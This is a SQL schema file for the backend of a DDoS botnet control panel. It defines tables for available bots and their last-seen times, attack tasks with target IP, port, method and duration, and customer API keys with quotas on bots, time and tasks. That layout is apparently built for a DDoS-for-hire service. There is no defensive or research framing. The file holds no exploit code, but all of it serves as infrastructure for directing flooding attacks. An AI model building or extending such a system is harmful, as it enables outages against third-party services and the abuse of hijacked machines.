DROP TABLE IF EXISTS ddos_avalible;
DROP TABLE IF EXISTS ddos_tasks;
DROP TABLE IF EXISTS ddos_apis;

CREATE TABLE `ddos_avalible` (
  `id` int(11) NOT NULL,
  `botid` varchar(255) NOT NULL,
  `lastseen` varchar(255) NOT NULL,
  `ddos_taskid` varchar(255) NOT NULL,
  `active` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `ddos_tasks` (
  `id` int(11) NOT NULL,
  `maxtime` varchar(255) NOT NULL,
  `port` varchar(255) NOT NULL,
  `targetip` varchar(255) NOT NULL,
  `method` varchar(255) NOT NULL,
  `created_by` varchar(255) NOT NULL,
  `origin_from` varchar(255) NOT NULL,
  `max_executions` varchar(255) NOT NULL,
   `executed_at` TIMESTAMP NOT NULL,
  `status` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `ddos_apis` (
  `id` int(11) NOT NULL,
  `apikey` varchar(255) NOT NULL,
  `created_by_user` varchar(255) NOT NULL,
  `infotype` varchar(255) NOT NULL,
  `max_bots_per_task` int(20) NOT NULL DEFAULT '1',
  `max_time_per_task` int(20) NOT NULL DEFAULT '1',
  `max_tasks` int(11) NOT NULL DEFAULT '1',
  `active` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

ALTER TABLE `ddos_tasks` ADD `created_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP AFTER `status`;

ALTER TABLE `ddos_tasks`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `ddos_apis`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `ddos_avalible`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `ddos_tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `ddos_apis`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `ddos_avalible`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;